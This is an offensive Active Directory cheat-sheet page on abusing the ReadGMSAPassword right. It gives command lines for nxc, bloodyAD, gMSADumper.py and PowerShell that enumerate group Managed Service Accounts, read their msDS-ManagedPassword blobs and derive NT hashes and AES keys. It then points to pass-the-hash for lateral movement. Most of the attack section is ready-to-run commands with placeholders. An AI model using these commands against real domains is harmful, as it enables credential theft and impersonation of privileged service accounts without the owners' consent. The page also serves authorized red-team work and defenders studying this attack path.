**Read GMSA password** — a gMSA (group Managed Service Account) is a service account whose password Active Directory generates and rotates on its own, so no human ever types it; the current value sits in the `msDS-ManagedPassword` attribute and only the principals listed in `msDS-GroupMSAMembership` are allowed to read it (BloodHound draws this as the `ReadGMSAPassword` edge). If you control one of those principals, you read that blob, derive the gMSA's NT hash, and from then on authenticate as that often-privileged account. Mechanically the tools below pull `msDS-ManagedPassword` over LDAP and compute the NT hash (and AES keys) from it.

## Discovery

BloodHound `ReadGMSAPassword` edge into a gMSA. Or enumerate gMSAs and who may read them:

```bash

nxc ldap 'DC_HOST' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' --gmsa
bloodyAD --host 'DC_IP' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' get object 'GMSA_ACCOUNT$' --attr msDS-GroupMSAMembership

```

## Exploitation

### From Linux

```bash

gMSADumper.py -u 'USER_NAME' -p 'USER_PASS' -d 'DOMAIN'
nxc ldap 'DC_HOST' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' --gmsa
bloodyAD --host 'DC_IP' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword

```

These print the gMSA's NT hash (and derived AES keys).

### From Windows

```powershell

# authorized reader only; then compute the NT hash from the blob
$mp = (Get-ADServiceAccount 'GMSA_ACCOUNT$' -Properties 'msDS-ManagedPassword').'msDS-ManagedPassword'
# or GMSAPasswordReader.exe --accountname GMSA_ACCOUNT

```

Use the recovered NT hash for pass-the-hash / tickets - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

- Read-only (no cleanup needed), but the gMSA password rotates (default 30 days) - the recovered hash expires.
- Distinct from **Golden GMSA** ([Trust Attacks](../Trust%20Attacks/Intra%20Forest%20Attacks/Golden%20GMSA%20Attack.md)), which abuses the KDS root key to compute *any* gMSA password offline.

## References

- The Hacker Recipes - ReadGMSAPassword - https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
- gMSADumper - https://github.com/micahvandeusen/gMSADumper
- NetExec - gMSA - https://www.netexec.wiki/ldap-protocol/gmsa
